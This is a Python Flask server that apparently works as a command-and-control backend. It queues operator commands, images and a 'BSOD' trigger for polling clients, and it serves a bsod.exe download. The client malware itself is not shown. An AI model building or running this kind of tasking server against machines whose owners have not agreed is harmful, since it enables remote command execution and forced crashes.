from flask_limiter.util import get_remote_address
from flask import Response, request, Flask
from flask_limiter import Limiter
from threading import Thread
from hashlib import sha256
from time import sleep

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app)
command: str = ""
image: bytes = b""
bsod_activated: bool = False


@app.route("/command-center", methods=["GET", "POST"])
def command_center() -> Response:
    if request.method == "GET":
        global command
        if len(command) == 0:
            return Response("no commands to execute", 204)
        else:
            answer = Response(command, 200)
            command = ""
            return answer


@app.route("/image-center", methods=["GET"])
def image_center() -> Response:
    global image
    if len(image) == 0:
        return Response("no images to show", 204)
    else:
        return image


@app.route("/bsod-center", methods=["GET"])
def bsod_center() -> Response:
    global bsod_activated
    if bsod_activated:
        bsod_activated = False
        return Response("1", 200)
    else:
        return Response("0", 204)


@app.route("/key.txt", methods=["GET"])
def easter_egg() -> Response:
    return Response("Hey, what are you doing there?", 418)


@app.route("/bsod.exe", methods=["GET"])
def server_bsod_exe() -> bytes:
    with open("static/bsod.exe", "rb") as bsod_file:
        return bsod_file.read()


@app.route("/", methods=["GET"])
def home() -> str:
    with open("static/index.html", "r", encoding="utf-8") as index_file:
        return index_file.read()


@app.route("/post_image", methods=["POST"])
def post_image() -> Response:
    if check_key(request.args.get("key")):
        global image
        image = request.files["image"].stream.read()
        Thread(target=post_image_thread, args=[image]).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_bsod", methods=["POST"])
def post_bsod() -> Response:
    if check_key(request.args.get("key")):
        global bsod_activated
        bsod_activated = True
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_command", methods=["POST"])
def post_command() -> Response:
    if check_key(request.args.get("key")):
        global command
        command = request.args.get("command")
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


def hash_key(key: str) -> str:
    return sha256(key.encode()).hexdigest()


def post_image_thread(data: bytes) -> None:
    global image
    image = data
    sleep(8)
    image = b""


def check_key(key: str) -> bool:
    with open("data/key.txt", "r") as key_file:
        if key_file.read() == hash_key(key):
            return True
    return False


def main() -> None:
    app.run("0.0.0.0", 80)


if __name__ == "__main__":
    main()
